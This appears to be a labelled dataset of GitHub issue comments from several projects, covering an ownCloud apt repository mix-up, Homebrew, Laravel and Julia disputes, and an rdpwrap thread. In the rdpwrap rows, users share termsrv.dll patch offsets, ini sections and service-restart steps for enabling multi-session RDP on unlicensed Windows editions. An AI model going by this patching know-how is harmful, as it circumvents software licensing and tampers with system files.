core/owncloud/27775/301240036,"I haven't the foggiest why I see 9.1.5 in ""stable"" where many other people still see 10.0. The only thing I might've done differently is that I changed my sources list to use the 9.1 PPA, so for this test I had to change it back to ""stable"", then run . Perhaps some of you could try to change and restore the repo, and see if that makes a difference. Also, could someone post the output of ? ",False,True,False,core/owncloud/27775
core/owncloud/27775/301242445,"Here's the apt policy without taking any of the other steps ie switching to 9.1 PPA. owncloud   Installed 9.1.5-1.1   Candidate 10.0.0-1.1   Version table      10.0.0-1.1 500         500  Packages  *** 9.1.5-1.1 100         100 /var/lib/dpkg/status On 13 May 2017 at 1138, yoniy0 notifications@friend.com wrote ",False,True,False,core/owncloud/27775
core/owncloud/27775/301248433,"My understanding is that 10.0 packages were (mistakenly?) uploaded to the repositories, and then removed. If you refreshed the package list through  while the 10.0 packages were there, they are now in your Apt index, and Apt will try to install them (which will fail, since they have been removed). In principle, running  now should remove them from the package list; on my system I have If that doesn't work for some weird reason, you can force Apt to ignore this version by putting this in  (And some terminology nitpicking please don't use the term ""PPA"" to refer to the Owncloud repositories; it should be reserved for those hosted on .) ",False,True,False,core/owncloud/27775
core/owncloud/27775/301248844,"Did this, /etc/apt/sources.list/owncloud.list renamed to owncloud.list.old ran apt-get update got warning N Ignoring file 'owncloud.list.old' in directory '/etc/apt/sources.list.d/' as it has an invalid filename extension ran apt-get upgrade got warning 0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded. N Ignoring file 'owncloud.list.old' in directory '/etc/apt/sources.list.d/' as it has an invalid filename extension N Ignoring file 'owncloud.list.old' in directory '/etc/apt/sources.list.d/' as it has an invalid filename extension renamed owncloud.list.old to owncloud.list ran apt-get update ran apt-get upgrade Now sudo apt list --installed owncloud says owncloud/unknown,now 9.1.5-1.1 all [installed] instead of previously when it said, owncloud/now 9.1.5-1.1 all [installed,upgradable to 10.0.0-1.1] So I suppose it fixed my problem. I’m not very good with apt but I would guess there is a better way to “refresh” the source. ",False,True,False,core/owncloud/27775
core/owncloud/27775/301254705,@friend 's workaround worked like a charm. Everything was updated on my machine. ,False,True,False,core/owncloud/27775
core/owncloud/27775/301262036,"This fixed the problem on my end too. Thank you! Il 13 Mag 2017 1718, ""Saphieron"" notifications@friend.com ha scritto ",False,True,False,core/owncloud/27775
core/owncloud/27775/301282670,Seemed to work for me as I get no message now when I upgrade. Renaming has to use mv rather than cp which is probably technically correct but just in case anyone else has problems renaming you must mv as cp doesn't work. ,False,True,False,core/owncloud/27775
core/owncloud/27775/301298802,"That is not a fix, please fix your repository properly. If you provide a repository for your software, it should not be broken so severely. ",False,True,False,core/owncloud/27775
core/owncloud/27775/301299630,@friend I don't think the repository is broken anymore. It's just the data on you local machine that is not correct anymore. ,False,True,False,core/owncloud/27775
core/owncloud/27775/301300514,"@friend Well, no. Since the repository was broken by Owncloud, they should fix it properly. Requiring the user to apply local steps is not a proper fix. Even more, it should not have happened in the first place. Do you operate public repositories if you are not knowing what you are doing. This should have never happened in the first place. By the way, a proper fix would have been to upload a new package to the repository, which has a higher version number (like 10.0.0-1~really9.1.5-2), which then would be picked up. Never just drop packages, once they have been published! This issues sheds quite a bad light on the quality in this project. ",False,True,False,core/owncloud/27775
core/owncloud/27775/301328929,quality in this project != quality of the repository 😄 Two different things and IMHO the OBS repositories should be dropped completely as a software project like ownCloud never should be responsible and provide linux repositories for such a large amount of different linux distros. ,False,True,False,core/owncloud/27775
core/owncloud/27775/301329149,"@friend As long as the repositories are provided officially by the project, the quality of these repositories is one part of the overall project quality. See my point from above, if you provide such a thing, make sure you know what you are doing, if not, do not setup a repository in the first place. ",False,True,False,core/owncloud/27775
core/owncloud/27775/301330172,"It might be a part, but a minor part and everyone is free to choose other installation methods better fitting / providing to their use case. And how should people get familiar / into that into the first place? If everyone would think like this and would never start then there would be progress in IT at all... 😉 ",False,True,False,core/owncloud/27775
core/owncloud/27775/301330950,"@friend It is all about how you appear to the outside world, minor or not, but it shows the project in bad light. It is not the first time this project has packaging problems like this. Are you serious? There are plenty ways to gain experience, just do not try to learn the basics in the public, official repository of a major open source project. You can start with your own private project, if you break it, only you are affected. But your attitude shows a deep lack of understanding of software engineering principles and basic common sense. I teach myself plenty of things via private projects, but once you work on something meant for production use, make damn sure you know what you are doing. The last remark shows again a worrying lack of professional attitude. ",False,True,False,core/owncloud/27775
core/owncloud/27775/301332731,Again This would avoid that we need to discuss this here. Another way Instead of complaining / flaming here about the repositories have you consider to just contribute and take over the maintenance? This is still Open Source and people are free to contribute if they think the repository maintainer don't understand the basics... ,False,True,False,core/owncloud/27775
core/owncloud/27775/301470026,"The workaround @friend used worked like a charm for me. Just a question, for the sake of knowledge It's technically possible to resolve the issue via repository uploading a temporary package? ",False,True,False,core/owncloud/27775
core/owncloud/27775/301564208,"@friend Yes, it is possible, as I described above. That would have been the correct solution instead of deleting an already published package. ",False,True,False,core/owncloud/27775
core/owncloud/27775/301574559,"Folks,  first of all.. 10.0 packages are still there, but not in the stable repository, this is because they were reverted, they won't be released to stable until next patch update. We cannot fix the fallout problems in your installation (or better said the weird apt behaviour ) magically from remote. We will try not to have to revert released packages again. Sorry for the inconvenience. ",False,True,False,core/owncloud/27775
core/owncloud/27775/302306800,"Hi, I ran into this problem. I'm not an expert on APT beyond simply using it, but after looking at the apt-cache manual page, this worked for me I was able to update fine after that. I moved those list files instead of deleting them just in case (and . was my home directory at the time), but it turns out I could have simply deleted them. That's specific to my Ubuntu release, so it would need to be adjusted for others. ",False,True,False,core/owncloud/27775
core/owncloud/27775/302927402,@friend Worked. Thanks. ,False,True,False,core/owncloud/27775
core/owncloud/27775/304669382,"Many thanks @friend for his shell commands. For me with my Ubuntu 16.04 LTS, I had to drop a few more files and use After that, apt-get was able to upgrade from 9.1.4 to 9.1.5. (I assume 10.0.1 or 10.0.2 will follow automatically as soon as they're considered stable enough) ",False,True,False,core/owncloud/27775
core/owncloud/27775/397456674,I wake up the thread since I got the same error some months ago (but did not look for a solution until today) and none of the proposed solutions here worked for me. I had to modify  from to Now update/upgrade runs with no problem. ,False,True,False,core/owncloud/27775
homebrew-cask/Homebrew/52035/360581053,"General troubleshooting steps  [x] I have retried my command with  and the issue is still present. [x] I have checked the instructions for reporting bugs. [x] I made doubly sure this is not a checksum does not match error. [x] I ran  and retried my command. [x] I ran , fixed as many issues as possible and retried my command. [x] I checked there are no open issues for the same problem. [x] I understand that if I ignore these instructions, my issue may be closed without review.  Description of issue I try to install the  cask, but during the installation it prompts me for a password (like sudo would), but does not accept my usual account password. I have no idea what password it's asking for.   Command that failed Output of command with Output of Output of ",False,True,False,homebrew-cask/Homebrew/52035
homebrew-cask/Homebrew/52035/421684766,I cannot reproduce this. Your cache is  and your user is . How are you running Homebrew exactly? ,False,True,False,homebrew-cask/Homebrew/52035
homebrew-cask/Homebrew/52035/421776212,@friend Using brewdo. Works just fine with normal brew (not brew cask). I've just noticed a similar issue as this one occurs for some other casks (but not all). ,False,True,False,homebrew-cask/Homebrew/52035
homebrew-cask/Homebrew/52035/421797294,Given that  is unmaintained and this isn't reproducible you'll have to figure this out yourself. ,False,True,False,homebrew-cask/Homebrew/52035
homebrew-cask/Homebrew/52035/421816363,"@friend No, it's not unmaintained. I help maintain it myself. Anyway I find your reply very unhelpful. Why not put some effort into fixing cask, when it's clearly a shortcoming of your software? ",False,True,False,homebrew-cask/Homebrew/52035
homebrew-cask/Homebrew/52035/421834841,"The ReadMe says I can't help you if I can't reproduce the issue. We don't work for you, so we don't owe you anything. You're free to send a PR to fixing this issue. ",False,True,False,homebrew-cask/Homebrew/52035
homebrew-cask/Homebrew/52035/421866743,"But you didn't even make a serious effort to (e.g. trying with brewdo), it would seem... Of course not; no one is claiming you do. As a maintainer though, I would expect more interest in getting the software to work for more people, however, rather than the clichéd ""doesn't work for me"" attitude. Anyway, this debate won't go anywhere I suspect. I'm glad you're open to accepting a PR. ",False,True,False,homebrew-cask/Homebrew/52035
homebrew-cask/Homebrew/52035/422142134,"@friend I’m confident the logic @friend applied is the same I would, so allow me to interject. First, consider the case from out point of view. We get literally dozens of daily issues/PRs, for something we’re doing for free with no reward (or expectation of one). This makes it so we have to triage problems quickly and decide which ones to pursue at any given time. That’s why the issue template even demands you certify you’re aware your issue may be closed without review if you don’t fill it — when a user cuts corners and decides to save themselves a few minutes, they’re wasting hours of our time in a needless back-and-forth to get all the information. Similarly, if a user is rude without provocation, they’re draining out mental fortitude to keep contributing. I’ll make clear none of these was the case with you, they’re examples of other situations. But here’s another example. When an issue can’t be reliably reproduced by a maintainer (especially if tried on a clean VM), then the issue is most likely to lie within the user’s personal configuration. So that means that to help that user, a maintainer is no longer maintaining the software, but instead providing free tech support, which is not the goal of open-source. Furthermore, if the user has a configuration so specific that it’s unlikely many others have it, dedicating maintainer time to it may mean hours or even days of completely wasted maintainer time, as none of it was spent meaningfully improving the software whatever workaround devised for that user’s particular problem would only help a tiny subset of users. For a user to get maintainer help with such a specific case, at the very least it’s their duty to investigate to the point where they can figure out the exact state that reproduces the problem, so further probing can take place. But do understand that even then a maintainer has no obligation to help, it only makes them likelier to. Because, as explained, it’s essentially defunct software. It hasn’t had commits in years and says right in the README that it’s unmaintained. Abandoned software only loses users, which means time spent hacking around it will only bring diminishing returns. What this all means is that spending time on your specific problem would not in practice make the software work for more people. Rather, it would take away from working on other more pressing problems that would in fact accomplish that. As for the time I spent writing this reply, I find it worth it because now I have a well written response I can link to in similar cases. I hope the explanation was acceptable to you, and has elucidated the inner workings of the project. ",False,True,False,homebrew-cask/Homebrew/52035
homebrew-cask/Homebrew/52035/422215464,"@friend Thank you for your clarification. And yes, though it may seem like a rather long reply, you've set out your points fairly, and as you say, much of it can be reused easily in other situations. In this case I would have appreciated if @friend had said outright something like ""running brew not as the current user"" is not officially supported. (I know it's never been supported to run it as the super user, but that's a slightly different matter.) Anyway, I'm sorry if I came off antagonistic, @friend. Hopefully I can by myself get brewdo working again with cask, and get a PR accepted here too as part of that, if the situation demands it. I'll try to remember to report back here if I do! ",False,True,False,homebrew-cask/Homebrew/52035
homebrew-cask/Homebrew/52035/422352892,"That’s good to know in hindsight. For reasonable users, like you seem to be, there’s usually one good argument that makes our point across. The problem is we don’t know which one it is (or if the user is reasonable)! Also note the situation could be entirely reversed. You could have gotten a more rushed explanation from me an insightful one from @friend. It just so happens he was the first to reply and was probably doing a ton of things at the same time. When I’m reviewing a bunch of issues/PRs in a row, sometimes my replies can seem curt. ",False,True,False,homebrew-cask/Homebrew/52035
framework/laravel/25212/350715197,"Example Compiles to What it SHOULD compile to It's supposed to be passing 512 as the 3rd argument into  instead of the 2nd argument which acts to disable several defaults such as JSON_HEX_APOS and JSON_HEX_QUOT. When going beyond a single key in your JSON/array, the directive will pick up the commas within the array declaration and interpret them as arguments for   due to its use of (Note If you test with 3 keys instead of 2, it will produce a valid json_encode call, but will be missing the 2nd and 3rd parameters) Problematic code  ",False,True,False,framework/laravel/25212
framework/laravel/25212/413214021,This is a known limitation #24734 ,False,True,False,framework/laravel/25212
framework/laravel/25212/413349828,"Why don't you add the 5 lines of code to remove this ""limitation""?  I'm happy to write the code to fix this bug.  All you have to do is parse out the content from within the square brackets before you explode the parameter list. ",False,True,False,framework/laravel/25212
framework/laravel/25212/413436788,"Thanks @friend for your suggestion, but I think for an Open Source project this isn't a nice attitude and I think… … that this would be very much appreciated! ",False,True,False,framework/laravel/25212
framework/laravel/25212/413440680,"@friend My ticket was closed after 8hr without even any discussion of how easy it might be fix/correct. Unfortunately this has become a common occurrence for me when trying to help improve Laravel.  I spend time crafting a descriptive ticket that includes debugging information, only to be told to ""go away"".  I hope the maintainers can become more understanding, or devs like myself (that are actually out in the field using Laravel in production), will just work around problems locally and not bother reporting them. ",False,True,False,framework/laravel/25212
framework/laravel/25212/463200154,Couldn't agree more ,False,True,False,framework/laravel/25212
framework/laravel/25212/463384813,Forgot this was still broken in Laravel! I hacked this is my projects by overriding the Blade directive I guess if we hurry we can get it fixed before Laravel 5.8 --- my track record of getting PRs merged isn't great so I've stopped bothering. Maybe @friend will take some interest here... ,False,True,False,framework/laravel/25212
julia/JuliaLang/29438/365216551,"Hey, I know you don't like questions here or issues of that kind BUT I'm not really getting much help on discourse as you can see here Basically  I’ve uploaded my package to Github and didjulia authors = [""TheOnlyArtz &lt;MAIL&gt;"", ""PurgePJ &lt;MAIL&gt;""] name = ""Julicord"" uuid = ""91c305b0-c482-11e8-244f-23e78ed5e04c"" version = ""0.1.0"" [deps] Dates = ""ade2ca70-3891-5945-98fb-dc099432e06a"" JSON = ""682c06a0-de6a-54ab-a142-c8b1cf79cde6"" WebSockets = ""104b5d7c-a370-577a-8038-80a2059c5097"" HTTP = ""cd3eb016-35fb-5094-929b-558a96fad6f3"" ♠ ",False,True,False,julia/JuliaLang/29438
julia/JuliaLang/29438/425715288,You mean in less than two hours during night time in the US? ,False,True,False,julia/JuliaLang/29438
julia/JuliaLang/29438/425729637,"Seriously, please stop asking questions on GitHub or you'll get blocked. ",False,True,False,julia/JuliaLang/29438
julia/JuliaLang/29438/425729809,"Okay sorry I'll stop, I'm just not getting answers to my questions and it's frustrating, I got a question that hangs for 9 hours now and you guys are replying damn quick on GitHub ",False,True,False,julia/JuliaLang/29438
julia/JuliaLang/29438/425732520,"There are almost 900 people who get emailed when you ask questions here, almost all of whom donate their time to make julia better. It's not their responsibility to solve your problems on your schedule; you're actively making this worse for all of us. You might want to spend more time patiently reading through existing packages for models. ",False,True,False,julia/JuliaLang/29438
julia/JuliaLang/29438/425732695,"I was about to say almost the same thing as @friend just wrote. Things may go better if you adjust your attitude a bit. You're not entitled to an answer—this is not customer support and you're not paying. If anyone answers, it's because they're generously donating their time, energy and expertise to help you. GitHub is where the people who build Julia work. Those are often the very same people who are best able to answer your questions on discourse. Annoying the people who can help you is not a great strategy for getting answers. ",False,True,False,julia/JuliaLang/29438
rdpwrap/stascorp/601/381460674,New CU KB4470788 for win10 1809 was released that updated termsrv.dll. It seems that offsets are the same as for 17763.1 version termsrv_x64.zip ,False,True,False,rdpwrap/stascorp/601
rdpwrap/stascorp/601/439596068,"Thanks RobertSpir, adding your lines from above to  then restarted the service with And it is working again. (Showing supported below and I can do multi-login) &lt;img width=""276"" alt=""screen shot 2018-11-16 at 11 24 22 pm"" src="" also recompiled the project from source at master, but that was likely not needed. ",False,True,False,rdpwrap/stascorp/601
rdpwrap/stascorp/601/439720020,I tried adding these lines to the end of the file but the service didn't come up at all. Any ideas what shall be changed? ,False,True,False,rdpwrap/stascorp/601
rdpwrap/stascorp/601/440672264,"Just for all users a short remark   Thanks to @friend Something has changed from 17763.1 (incl .55, .107 and .134) to 17763.165 in the x64-data [10.0.17763.165] // LocalOnlyOffset.x64=xxxxx // xxxxx.(17763.1) =77941 ♢ xxxxx.(17763.165) =77AF1 ( tested and validated) all other x64-ini-data for 1809rs517763.1 to .134 are the same as .165-data hint SingleUserOffset.x64=132F9 may be also ==1322C as in the original-ini from 2018-10-10 x86 data not yet fully tested if identical with the base data 17763.1 ( suppose NO!) ",False,True,False,rdpwrap/stascorp/601
rdpwrap/stascorp/601/440673603,"Ok, i found my mistake, i didn't change the date of the file ) Now it works flawlessly .. Many thanks guys. ",False,True,False,rdpwrap/stascorp/601
rdpwrap/stascorp/601/440986010,"Hallo - here my findings for 1809_1773.165  ;----------------------------------------------- ; CU KB4470788 for win10 1809 was released that updated termsrv.dll. ; Do not modify without special knowledge ; here is a validated version for 17763.165  ( with ida and in VM)  ; Base is #601 - @friend -mod add 17763( in .1/.134 and in .165 ) ; compared to upd-rdpwarp.ini_2018-10-10 for x86 and x64 ; Date 18-11-22  ; for manually adding the snip-text to your rdpwrap.ini in/to hinted location ; at the end you find a small directive as a how-to manually implement your new ini ;[Main] ;[SLPolicy] ;[PatchCodes] ;--------snip------------- [10.0.17763.165] LocalOnlyPatch.x86=1 LocalOnlyOffset.x86=AFC74 LocalOnlyCode.x86=jmpshort LocalOnlyPatch.x64=1 LocalOnlyOffset.x64=77AF1 LocalOnlyCode.x64=jmpshort ; SingleUserPatch.x86=1 SingleUserOffset.x86=4D665 SingleUserCode.x86=nop SingleUserPatch.x64=1 ; SingleUserOffset.x64=132F9  --  Github StasCorp/rdpWrap #601 @friend ; SingleUserOffset.x64=1322C  --  StasCorp original 2018-10-10 SingleUserOffset.x64=1322C SingleUserCode.x64=Zero ; DefPolicyPatch.x86=1 DefPolicyOffset.x86=4BE69 DefPolicyCode.x86=CDefPolicy_Query_eax_ecx DefPolicyPatch.x64=1 DefPolicyOffset.x64=17F45 DefPolicyCode.x64=CDefPolicy_Query_eax_rcx ; SLInitHook.x86=1 SLInitOffset.x86=5B18A SLInitFunc.x86=New_CSLQuery_Initialize SLInitHook.x64=1 SLInitOffset.x64=1ABFC SLInitFunc.x64=New_CSLQuery_Initialize ;--------snip------------- ; ;[SLInit] ; ;--------snip------------- [10.0.17763.165-SLInit] bInitialized.x86      =CD798 bServerSku.x86        =CD79C lMaxUserSessions.x86  =CD7A0 bAppServerAllowed.x86 =CD7A8 bRemoteConnAllowed.x86=CD7AC bMultimonAllowed.x86  =CD7B0 ulMaxDebugSessions.x86=CD7B4 bFUSEnabled.x86       =CD7B8 ; bInitialized.x64      =ECAB0 bServerSku.x64        =ECAB4 lMaxUserSessions.x64  =ECAB8 bAppServerAllowed.x64 =ECAC0 bRemoteConnAllowed.x64=ECAC4 bMultimonAllowed.x64  =ECAC8 ulMaxDebugSessions.x64=ECACC bFUSEnabled.x64       =ECAD0 ;--------snip------------- ;------------------------use as batch / cmd -------------------------------------------- cls @friend off echo. echo. ""TERMSERVICE"" will be stopped in phase ONE when you continue and  ..... echo. echo. 1) You may make (!elevated) changes to ""Windows\System32\termsrv.dll""  echo. 2) You may make more        changes to ""Program Files\RDP Wrapper\rdpwrap.ini""  echo.                                      or in ""Windows\System32\rdpwrap.ini"" echo. echo.    If You use update/Install/uninstall  echo.    You should use modified version of mod.install.bat ( !No -o option) echo.    and mod.uninstall.bat with option -k echo.    You may overwrite or delete your ""manually"" implemeted rdpwrap.ini  echo.    especially if you use update.bat unmodified !. echo     RDP Wrapper Library v1.6 // Installer v2.3 //Copyright (C) Stas'M Corp. 2016 echo     USAGE  RDPWInst.exe [-l ^|-i [-s] [-o] ^|-w ^|-u [-k] ^|-r] echo     -l     display the license agreement echo     -i     install wrapper to Program Files folder (default) echo     -i -s  install wrapper to System32 folder echo     -i -o  online install mode (loads latest INI file)        critical! echo     -w     get latest update for INI file                     critical! echo     -u     uninstall wrapper                                  critical! echo     -u -k  uninstall wrapper and keep settings echo     -r     force restart Terminal Services echo. echo. 3) You may add/update (rfxvmt.dll)  in ""Windows\SYSWOW64\""  echo.     if you have a missing one or older one in x64-Home  echo. echo. ""YOUR ACTION SHOULD BE FINISHED""  after Phase-ONE  echo. When you go-on to Phase-TWO then  ""TERMSERVICE""  echo.       will be started again in Phase-TWO echo. ECHO. ""PHASE-ONE""  of two phases echo. echo.  CTRL-C aborts pause net stop termservice echo. Waiting for ""Your Action(s)""  echo. Or You may go-on to PHASE-TWO of two  ? echo. echo.  CTRL-C aborts pause net start termservice pause ;--------------------------------------------------------------------------- ",False,True,False,rdpwrap/stascorp/601
rdpwrap/stascorp/601/442349023,"termsrv.dll was updated to 167, offsets seems to be the same ",False,True,False,rdpwrap/stascorp/601
rdpwrap/stascorp/601/445444424,@friend on my current .ini file i see those lines Do i have to replace them with the lines of @friend  and also Replace termsrv.dll he posted ? ,False,True,False,rdpwrap/stascorp/601
rdpwrap/stascorp/601/445451299,"@friend  ; Hello , for each build  ,  a need for the two ini-Section [10.0.17763.nnn] and [10.0.17763.nnn-SLInit]  / nnn= (1 , 165, 167, 168 ) is given, which contains both (.x64 and .x86)  offset-values. This ensures that all these builds will be recognized. I did a replication of my findings (snip-listing Sections [10.0.17763.165] and [10.0.17763.165-SLInit]  above) for all three 177763.nnn-builds (165,167,168), adding these section  by taking the original build from 2018-10-10 from the repository, whereby the number were set according to the wanted build. (The difference is from builds 17763.1 to 17763.165). I put each section in a row behind 17763.1 and 17763.1-Slinit. Please be aware not stumbling  over a) os-bit version b) not using ""net stop TermService"" and changing the ""newly"" edited ini-file. See my comment risk of overwriting this file using unmodified ""install.bat/uninstall.bat"" or the ""update.bat"" c) after you have replaced the ini-file do restart the ""PC"" or at least use ""start net TermService"". Remark each build 17763.1 , .165 , 167 , 168 comes with an own ""build"" version of Termsrv.dll ( x64,x86). (The rfxvmt.dll (x64 , x86 ) has always 17763.1, whereby the the added (older) rfxvmt.dll in syswow64 from the rdp-wrapper install also still works fine. Therefore in x64 you several choices to circumvent the stumbling stones. Please let me know if this helped, Getting the Termsrv.dll and rfxvmt.dll from the dedicated install.wim (x64 / x86) or do a simple VM insall of the OS-build of your choice ( my recommendation) and follow up the workflow,  . Good Luck ",False,True,False,rdpwrap/stascorp/601
rdpwrap/stascorp/601/445547091,"Despite the description of @friend I don't seem to get it working in 17763.168 So I got the 2018-10-10 rdpwrap.ini, added two sections for .168 and .168-SLinit, copying the data from the 165 and .165-SLInit respectively. net stop termservice net start termservice and … termservice crashes.. I did not fiddle with the dlls. (BTW still fighting with virusscanner too -- maybe this disturbes things as well?) ",False,True,False,rdpwrap/stascorp/601
rdpwrap/stascorp/601/445551658,"@friend wrote   Despite the description I don't seem to get it working in 17763.168 …... „I did not fiddle with the dlls.“  ……  BTW still fighting with virusscanner too … maybe this disturbes Things       &gt;&gt;    (!yes may be!)        &gt;&gt;    ?? ( Which one do you use ?         &gt;&gt;     !! Some do strictly forbid                     making changes in surveyed/observed (System) areas.                  ! – use $MS Defender only ,  I  had never a Problem with it – but with others                  !  Try to Keep it Simple (K.I.S.S.) at least for the implementation phase  …..   and … termservice crashes..        &gt;&gt;    ??  ‚When‘ and ‚What‘ is the message  or Event id ?  There is no „fiddling“ necessary  , except If you really want to test manually several builds of  “termsrv.dll“, which is not the normal workflow.  So I did it  just straight „Forward“  Use at the first time install or update Win10 and  use the „Install.bat“  ( only once, with Option -o) to get the updated Version of rdpwrap.ini of the repository {2018-10-10), otherwise you receive with rpd-wrap 1.62 the ini-file 2017-12-27 net stop termservice (elevated) and  watch Messages in  the admin-console (see my batch cmd proposal) edit rdpwrap.ini with the updated [section-version] according to your termsrv.dll in system32. net start termservice (elevated) and  watch Messages in  the admin-console just see my result at  last post (hajubu- 18-12-09) in #606    ",False,True,False,rdpwrap/stascorp/601
rdpwrap/stascorp/601/445560995,"Yep, @friend, I did exactly that. my termserv.dll is .168, the appcrash event in the eventviewer shows P2 10.0.17763.1 (.1, not .168?) (2 events were logged on each crash, 1000 from Application Error and 1001 from Windows Error Reporting - but this is not relevant anymore - please read on) The virusscanner (McAfee) only puts rdpconf in quarantine. On another machine I am at .134 and there I succeed with the vanilla rdpwrap.ini (10-10-18). So, with 10-10-18 file (no modifications) I can RDP into the machine, but only 1 session at a time. Then, when adding the entries for .168 (just above the [SLInit] section) and .168.SLInit (the bottom of the file) I have several possibilities either the service doesn't start at all, or it starts then crashes when attempting to open an RDP session. So I decided to start over again.  changed the date in the file to 18-10-09 (otherwise the next step fails with ) Get the 'clean 10-10 INI file' by running RDPWInst -w  Added the new sections [10.17763.168] and [10.17763.168-SLInit] with the code from @friend and your modifications  Save, Net stop termservice, Net start termservice  No errors in eventlog, service is running (from services.msc) test by starting mstsc from another computer TADAA!! It is working  Happy. Now, the only thing I have to do is to convince McAfee that they show a false positive on rdpconf.exe, so I can use that tool as well. ",False,True,False,rdpwrap/stascorp/601
rdpwrap/stascorp/601/445562997,"andrePKI wrote ….in the eventviewer shows P2 10.0.17763.1 (.1, not .168?) Just a short remark  to  [Main] updated=yyy.mm.dd i.r. to rdpwrap.ini  Updated=yyyy.mm.dd  .GE „last.ini in repo“ prevents regular update with update.bat i.r. to DATE  Update=yyy.mm.dd  .LT pulls the „last.ini“ from repo    Other may Need both x64 and x86        should positioned acc. to the given  logic in the origial rdpwrap.ini   ",False,True,False,rdpwrap/stascorp/601
rdpwrap/stascorp/601/445823677,"Unfortunately doesnt work for me. heres what i get in event logger   Faulting application name svchost.exe_TermService, version 10.0.17763.1, time stamp 0xb900eeff Faulting module name rdpwrap.dll, version 1.5.0.0, time stamp 0x5488aa5a Exception code 0xc0000005 Fault offset 0x00000000000029fc Faulting process id 0x4abc Faulting application start time 0x01d4908f667b83cc Faulting application path C\WINDOWS\System32\svchost.exe Faulting module path c\program files\rdp wrapper\rdpwrap.dll Report Id e4b5a0fe-4354-4b60-85d4-31502627058b Faulting package full name  Faulting package-relative application ID ",False,True,False,rdpwrap/stascorp/601
rdpwrap/stascorp/601/445835255,"@friend  I'm a little bit confused, as you added in ""head"" the protocol / Post from @friend 18-12-09. In the tail of your post the ""Exception Code 0xc0000005"" is an ""well known"" error code, whereas the causes may be for the  (1) Error ‘0xC0000005 Access Violation’ error are corrupt registry, .... (2) Error '0xC0000005 Virus ( - oops! It could be a false/positive of your Virusscanner ( like McAfee, etc)       as andrePIK already reported , RDPconf.exe was caught as such.      I personally keeps it simple (K.I.S.S) with Win10 Defender - no problem at all. (3) Error '0xC0000005 also a forbidden ""overwriting"" of ""old"" remained data may causes such effects Another Msg part hold "" Fault offset 0x00000000000029fc"" and the ""TermService, version 10.0.17763.1"" points to an effect that at the time the error occurred, the ""older"" version of 17763.1 is still registered. Therefore make sure that you did a ""sober""  OS-Update to ""new"" 17763.168 ( I suppose you wanted that) with // last CU KB4469342 (v168.1.10 ) and SSU KB4470788 both from 2018-12-04 // msuSSU must be installed before CU , only the 'older' KB4469342 (cab) should/(must) be overwritten. --- I also installed KB4471331(adobe flash) and KB 4469041 -preview CU upd NetFramew.3.5/4.72) which I believe not so important --- //  If you want to do it manually , please have a good knowledge how to handle the System privileges rules. -- see my post from 18-12-09 in #606 for more details . Good Luck ",False,True,False,rdpwrap/stascorp/601
rdpwrap/stascorp/601/446014067,"@friend got the same error as @friend. I've used the snippet from @friend As soon as I remove this from the .ini the service starts without problems. Updates were installed in the right order. Also, I've tried to disable anti-virus as well. Seems to be that the old version of the TermSerivce is causing the problem as @friend suggested. Any ideas how to register the new version? Update in the meantime I’ve overwritten termsrv.dll with version .165 and it works (thanks for the snippet @friend). This is a workaround for now. The termsrv.dll in the first comment is good, thanks for that @friend. To overwrite, the owner of the file has to be changed to admin and permissions has to be granted for writing. Stop/start of termservice is needed at the end of the process. ",False,True,False,rdpwrap/stascorp/601
rdpwrap/stascorp/601/446096240,"@friend, @ Hajubu wrote But the version in the eventlog refers to svchost.exe, which is .1, not .168, so nothing strange there. This process runs as local system, hence the error 5 (0xc00000005) is odd. I am not sure about the order of the section in the ini file (normally it should  not matter), but to be safe I would put [10.0.17763.168] around the middle, just above [SLInit] section and [...168-SLInit] at the bottom of the ini file. ",False,True,False,rdpwrap/stascorp/601
rdpwrap/stascorp/601/446116609,"@friend   ….. [Hajubu wrote ''' Another Msg part hold "" Fault offset 0x00000000000029fc"" and the ""TermService, version 10.0.17763.1"" points to an effect that at the time the error occurred, the ""older"" version of 17763.1 is still registered. '''' but I believe there is a little misunderstanding If the OS-Update from.1 to .168 was done right and „sober“ before,  I’d never observed a message with „the old Version I had before“ the update of the rdpwrap.ini. Exchanging „termsrv.dll“ on-the-fly needs a knowledge of handling privileges ( or a tool ) ….. Running the …process as  local System, hence the error 5 (0xc00000005) is odd …“ ……I am not sure about the order of the section in the ini file (normally it should not matter)  @friend  wrote  in the update to your post you said  [10.0.1773.165]…[10.0.17763.165-SLinit] data  works with now with termsrv.dll.165 which is the way it should. For any other Version of win10.1809_17763.xxx-termsrv.dll.xxx you need an seperate section-pair. 17763.1    ,  as set in the rdpwrap.ini  in the repository) 17763.165 ,  as  you used it. 17763.167  and / or 17763.168    as I explained    Add the data from the [10.0.1773.165]…[10.0.17763.165-SLInit] Section pair  in a new pair of sections with each Header(s)                                   for [10.0.17763.167] and [10.0.17763.167-SLInit] and / or                                    for [10.0.17763.168] and [10.0.17763.168-SLInit] just below the above discussed and referenced positions in the ini file. Remark  a) From termsrv.dll.1 to termsrv.165 is a difference in the ini-sections data.                    Rdpwarp.ini in the repository (Coderes\rdpwrap.ini) used                 b) When you do a ""normal"" update.bat call and may overwrite your just edited                    ""new"" ini-file depending of the Update=yyyy.mm.dd in the [Main]-section ""is Less""                    then the actual one in the repo [i.e. 2018-10-10]                    containing only the 1809-build with   10.0.17763.1.                 c) To avoid to overwrite the already updated rdpwrap.ini you may edit update.bat and                    delete the option { -o } in the line3 just behind (...  RDPWinst"" -i) from (RDP-Wrapper V1.62). JUST To Ease The Job I do recommend to test the workflow always in a VM/Vbox Environment. I  explained, for those who are not familiar with handling „System Privileges“ exceptions To do  ""FIRST"" a „sober“ – Standard - „ OS-Update to ""new"" 17763.168 (…. If wanted …) with // last CU KB4469342 (v168.1.10 i ) and SSU KB4470788 both from 2018-12-04 -- and ""THEN"" use the workflow to add the [.168 ini-Section] where you need these. -- see my post from 18-12-09 in #606 for more detail -- or follow the post of andrePKI 18-1210 in #601 ",False,True,False,rdpwrap/stascorp/601
rdpwrap/stascorp/601/446689379,"just a short note  10.0.17763.194 - CU KB4471332 - keeps/lifts the termsrv.dll to its file version 10.0.17763.168. Therefore since .165, .167, .168 use the data-offset, which are the same, we have to add to the rdpwrap.ini dated 2018-10-10 ( last.ini in the repository - code res\rdpwrap,ini). Ensure you have the correct ini file with two ini-sections [10.0.17763.1] , [10.0.17763.1-SLInit] and add then the two sections [10.0.17763.168], [17763.168-SLInit] ---------------read more in #611 -------------------------------- ",False,True,False,rdpwrap/stascorp/601
